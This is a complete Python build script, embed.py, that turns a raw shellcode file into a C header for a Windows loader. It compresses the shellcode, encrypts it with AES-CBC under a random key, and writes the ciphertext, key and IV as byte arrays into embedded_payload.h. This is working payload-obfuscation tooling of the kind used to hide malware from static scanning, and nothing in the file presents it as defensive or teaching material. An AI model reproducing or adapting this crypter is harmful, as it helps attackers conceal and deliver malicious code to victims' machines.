#!/usr/bin/env python3
# generates embedded_payload.h from shellcode (compress and encrypt)

import sys, os, zlib, struct
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


def pad(data, bs=16):
    pad_len = bs - (len(data) % bs)
    return data + bytes([pad_len] * pad_len)


def bytes_to_c_array(data, name, per_line=16):
    lines = []
    lines.append(f"static const unsigned char {name}[] = {{")
    for i in range(0, len(data), per_line):
        chunk = data[i:i+per_line]
        hex_vals = ', '.join(f'0x{b:02x}' for b in chunk)
        comma = ',' if i + per_line < len(data) else ''
        lines.append(f"    {hex_vals}{comma}")
    lines.append("};")
    return '\n'.join(lines)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> [-o output.h]", file=sys.stderr)
        sys.exit(1)

    sc_path = sys.argv[1]
    out_path = "embedded_payload.h"
    if '-o' in sys.argv:
        out_path = sys.argv[sys.argv.index('-o') + 1]

    with open(sc_path, 'rb') as f:
        raw = f.read()

    print(f"Original:   {len(raw):,} bytes", file=sys.stderr)

    compressed = zlib.compress(raw, 9)
    print(f"Compressed: {len(compressed):,} bytes ({len(compressed)*100//len(raw)}%)", file=sys.stderr)

    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(compressed))

    print(f"Encrypted:  {len(encrypted):,} bytes", file=sys.stderr)

    with open(out_path, 'w') as f:
        f.write("// Auto-generated by embed.py — do not edit\n")
        f.write(f"// Shellcode: {os.path.basename(sc_path)}\n")
        f.write(f"// Original size: {len(raw)} bytes\n\n")
        f.write("#pragma once\n\n")
        f.write(bytes_to_c_array(key, "EMBEDDED_KEY"))
        f.write("\n\n")
        f.write(bytes_to_c_array(iv, "EMBEDDED_IV"))
        f.write("\n\n")
        f.write(f"static const DWORD EMBEDDED_ORIG_SIZE = {len(raw)};\n")
        f.write(f"static const DWORD EMBEDDED_DATA_LEN = {len(encrypted)};\n\n")
        f.write(bytes_to_c_array(encrypted, "EMBEDDED_DATA"))
        f.write("\n")

    print(f"Header:     {out_path} ({os.path.getsize(out_path):,} bytes)", file=sys.stderr)


if __name__ == '__main__':
    main()
